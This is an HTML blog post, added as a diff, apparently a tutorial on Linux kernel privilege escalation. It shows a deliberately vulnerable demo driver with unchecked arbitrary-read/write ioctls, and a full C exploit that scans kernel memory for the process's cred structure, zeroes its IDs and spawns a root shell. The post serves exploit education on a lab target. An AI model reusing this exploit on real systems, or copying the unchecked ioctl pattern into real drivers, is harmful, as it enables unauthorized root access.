@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>linux 内核提权总结(demo&#43;exp分析) -- 任意读写(一) - povcfe&#39;s blog</title><meta name="Description" content="povcfe&#39;s blog"><meta property="og:title" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(一)" />
+<meta property="og:description" content="发表于看雪论坛
+cred篇   每个线程在内核中都对应一个线程结构块thread_info
+  thread_info中存在task_struct类型结构体
+  struct task_struct中存在cred结构体用来保存线程权限
+  攻击流程
+ 定位某进程的cred结构体 将cred结构提结构体的uid~fsgid全部覆写为0(前28字节)    一. 利用步骤 1. 定位cred结构体   task_struct中存在char comm[TASK_COMM_LEN]
+  comm字符串使用prctl函数的PR_SET_NAME自行设置
+  在内存中搜索被设置后的comm字符串，cred结构体地址就在附近
+  泄漏cred结构体地址，定向覆盖cred结构体
+  2. 进程权限被修改，变成root进程，执行system(&quot;/bin/sh&quot;)，弹出root shell 二. 驱动代码 #include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/cdev.h&gt;#include &lt;linux/device.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/uaccess.h&gt;#include &lt;asm/cacheflush.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 #define SET_MEM 0x100003  dev_t dev_id = 0; struct cdev cdev_0; struct class *dev_class; struct vunl { char *point; size_t size; } VUNL; long rw_any_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { int ret = 0; switch (cmd) { case CHANGE_POINT: ret = copy_from_user(&amp;VUNL, (struct vunl *)(arg), sizeof(struct vunl)); break; case RW_READ: ret = copy_to_user((char *)arg, (char *)VUNL." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://povcfe.github.io/posts/kernel_rw1/" />
+<meta property="og:image" content="https://povcfe.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-01-11T10:31:33-08:00" />
+<meta property="article:modified_time" content="2020-01-11T10:31:33-08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://povcfe.github.io/logo.png"/>
+
+<meta name="twitter:title" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(一)"/>
+<meta name="twitter:description" content="发表于看雪论坛
+cred篇   每个线程在内核中都对应一个线程结构块thread_info
+  thread_info中存在task_struct类型结构体
+  struct task_struct中存在cred结构体用来保存线程权限
+  攻击流程
+ 定位某进程的cred结构体 将cred结构提结构体的uid~fsgid全部覆写为0(前28字节)    一. 利用步骤 1. 定位cred结构体   task_struct中存在char comm[TASK_COMM_LEN]
+  comm字符串使用prctl函数的PR_SET_NAME自行设置
+  在内存中搜索被设置后的comm字符串，cred结构体地址就在附近
+  泄漏cred结构体地址，定向覆盖cred结构体
+  2. 进程权限被修改，变成root进程，执行system(&quot;/bin/sh&quot;)，弹出root shell 二. 驱动代码 #include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/cdev.h&gt;#include &lt;linux/device.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/uaccess.h&gt;#include &lt;asm/cacheflush.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 #define SET_MEM 0x100003  dev_t dev_id = 0; struct cdev cdev_0; struct class *dev_class; struct vunl { char *point; size_t size; } VUNL; long rw_any_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { int ret = 0; switch (cmd) { case CHANGE_POINT: ret = copy_from_user(&amp;VUNL, (struct vunl *)(arg), sizeof(struct vunl)); break; case RW_READ: ret = copy_to_user((char *)arg, (char *)VUNL."/>
+<meta name="application-name" content="povcfe&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="povcfe&#39;s blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://povcfe.github.io/posts/kernel_rw1/" /><link rel="prev" href="https://povcfe.github.io/posts/kernel_rop2/" /><link rel="next" href="https://povcfe.github.io/posts/kernel_rw2/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "linux 内核提权总结(demo+exp分析) -- 任意读写(一)",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/povcfe.github.io\/posts\/kernel_rw1\/"
+        },"genre": "posts","keywords": "linux kernel, rw, exp","wordcount":  372 ,
+        "url": "https:\/\/povcfe.github.io\/posts\/kernel_rw1\/","datePublished": "2020-01-11T10:31:33-08:00","dateModified": "2020-01-11T10:31:33-08:00","publisher": {
+            "@type": "Organization",
+            "name": "作者"},"author": {
+                "@type": "Person",
+                "name": "作者"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="povcfe&#39;s blog">povcfe&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="povcfe&#39;s blog">povcfe&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">linux 内核提权总结(demo&#43;exp分析) -- 任意读写(一)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>作者</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/linux%E5%86%85%E6%A0%B8%E6%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i class="far fa-folder fa-fw"></i>linux内核态漏洞利用</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-01-11">2020-01-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 372 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#cred篇">cred篇</a>
+      <ul>
+        <li><a href="#一-利用步骤">一. 利用步骤</a></li>
+        <li><a href="#二-驱动代码">二. 驱动代码</a></li>
+        <li><a href="#三-exp">三. exp</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="https://bbs.pediy.com/user-839858.htm" target="_blank" rel="noopener noreffer">发表于看雪论坛</a></p>
+<h2 id="cred篇">cred篇</h2>
+<ul>
+<li>
+<p>每个线程在内核中都对应一个线程结构块thread_info</p>
+</li>
+<li>
+<p>thread_info中存在task_struct类型结构体</p>
+</li>
+<li>
+<p>struct task_struct中存在cred结构体用来保存线程权限</p>
+</li>
+<li>
+<p>攻击流程</p>
+<ul>
+<li>定位某进程的cred结构体</li>
+<li>将cred结构提结构体的uid~fsgid全部覆写为0(前28字节)</li>
+</ul>
+</li>
+</ul>
+<h3 id="一-利用步骤">一. 利用步骤</h3>
+<h4 id="1-定位cred结构体">1. 定位cred结构体</h4>
+<ul>
+<li>
+<p>task_struct中存在char comm[TASK_COMM_LEN]</p>
+</li>
+<li>
+<p>comm字符串使用prctl函数的PR_SET_NAME自行设置</p>
+</li>
+<li>
+<p>在内存中搜索被设置后的comm字符串，cred结构体地址就在附近</p>
+</li>
+<li>
+<p>泄漏cred结构体地址，定向覆盖cred结构体</p>
+</li>
+</ul>
+<h4 id="2-进程权限被修改变成root进程执行systembinsh弹出root-shell">2. 进程权限被修改，变成root进程，执行system(&quot;/bin/sh&quot;)，弹出root shell</h4>
+<h3 id="二-驱动代码">二. 驱动代码</h3>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;linux/cdev.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;linux/device.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;asm/cacheflush.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define CHANGE_POINT 0x100000
+</span><span class="cp">#define RW_READ 0x100001
+</span><span class="cp">#define RW_WRITE 0x100002
+</span><span class="cp">#define SET_MEM 0x100003
+</span><span class="cp"></span>
+<span class="n">dev_t</span> <span class="n">dev_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">struct</span> <span class="n">cdev</span> <span class="n">cdev_0</span><span class="p">;</span>
+<span class="k">struct</span> <span class="n">class</span> <span class="o">*</span><span class="n">dev_class</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">vunl</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">point</span><span class="p">;</span>
+    <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">VUNL</span><span class="p">;</span>
+
+<span class="kt">long</span> <span class="nf">rw_any_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="p">{</span>
+    <span class="k">case</span> <span class="nl">CHANGE_POINT</span><span class="p">:</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">VUNL</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vunl</span> <span class="o">*</span><span class="p">)(</span><span class="n">arg</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">vunl</span><span class="p">));</span>
+        <span class="k">break</span><span class="p">;</span>
+
+    <span class="k">case</span> <span class="nl">RW_READ</span><span class="p">:</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">VUNL</span><span class="p">.</span><span class="n">point</span><span class="p">,</span> <span class="n">VUNL</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+
+    <span class="k">case</span> <span class="nl">RW_WRITE</span><span class="p">:</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">copy_from_user</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">VUNL</span><span class="p">.</span><span class="n">point</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="n">VUNL</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+
+    <span class="k">default</span><span class="o">:</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">rw_any_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">base_minor</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dev_num</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">fops</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">rw_any_ioctl</span><span class="p">};</span>
+    <span class="n">alloc_chrdev_region</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev_id</span><span class="p">,</span> <span class="n">base_minor</span><span class="p">,</span> <span class="n">dev_num</span><span class="p">,</span> <span class="s">&#34;rw_any&#34;</span><span class="p">);</span>
+    <span class="n">cdev_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cdev_0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fops</span><span class="p">);</span>
+    <span class="n">cdev_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cdev_0</span><span class="p">,</span> <span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">dev_class</span> <span class="o">=</span> <span class="n">class_create</span><span class="p">(</span><span class="n">THIS_MODULE</span><span class="p">,</span> <span class="s">&#34;rw_any_class&#34;</span><span class="p">);</span>
+    <span class="n">device_create</span><span class="p">(</span><span class="n">dev_class</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dev_id</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;rw_any_dev&#34;</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">rw_any_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">device_destroy</span><span class="p">(</span><span class="n">dev_class</span><span class="p">,</span> <span class="n">dev_id</span><span class="p">);</span>
+    <span class="n">class_destroy</span><span class="p">(</span><span class="n">dev_class</span><span class="p">);</span>
+    <span class="n">cdev_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cdev_0</span><span class="p">);</span>
+    <span class="n">unregister_chrdev_region</span><span class="p">(</span><span class="n">dev_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">module_init</span><span class="p">(</span><span class="n">rw_any_init</span><span class="p">);</span>
+<span class="n">module_exit</span><span class="p">(</span><span class="n">rw_any_exit</span><span class="p">);</span>
+
+<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
+</code></pre></div><h3 id="三-exp">三. exp</h3>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
+</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define CHANGE_POINT 0x100000
+</span><span class="cp">#define RW_READ 0x100001
+</span><span class="cp">#define RW_WRITE 0x100002
+</span><span class="cp"></span>
+<span class="k">struct</span> <span class="n">vunl</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">point</span><span class="p">;</span>
+    <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">VUNL</span><span class="p">;</span>
+
+<span class="n">size_t</span> <span class="nf">leak_data</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">target</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">size_t</span> <span class="n">cred</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">size_t</span> <span class="n">real_cred</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">VUNL</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="mh">0xffff880000000000</span><span class="p">;</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0xffffc80000000000</span><span class="p">;</span> <span class="n">addr</span> <span class="o">+=</span> <span class="mh">0x1000</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">VUNL</span><span class="p">.</span><span class="n">point</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">;</span>
+
+        <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANGE_POINT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">VUNL</span><span class="p">);</span>
+        <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RW_READ</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">memmem</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] the addr of comm[TASK_COMM_LEN] is: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">res</span><span class="p">);</span>
+            <span class="n">cred</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">res</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">);</span>
+            <span class="n">real_cred</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">res</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">((</span><span class="n">cred</span> <span class="o">||</span> <span class="mh">0xff00000000000000</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">real_cred</span> <span class="o">==</span> <span class="n">cred</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] found cred 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">real_cred</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] not found, try again!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">real_cred</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">target</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;TheTargetOfComm&#34;</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">size_t</span> <span class="n">cred</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_NAME</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/rw_any_dev&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="n">VUNL</span><span class="p">.</span><span class="n">point</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">leak_data</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
+    <span class="n">VUNL</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">28</span><span class="p">;</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANGE_POINT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">VUNL</span><span class="p">);</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RW_WRITE</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] r00t:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] error!&#34;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-01-11</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux-kernel/">linux kernel</a>,&nbsp;<a href="/tags/rw/">rw</a>,&nbsp;<a href="/tags/exp/">exp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/kernel_rop2/" class="prev" rel="prev" title="linux 内核提权总结(demo&#43;exp分析) -- ROP(二)"><i class="fas fa-angle-left fa-fw"></i>linux 内核提权总结(demo&#43;exp分析) -- ROP(二)</a>
+            <a href="/posts/kernel_rw2/" class="next" rel="next" title="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(二)">linux 内核提权总结(demo&#43;exp分析) -- 任意读写(二)<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
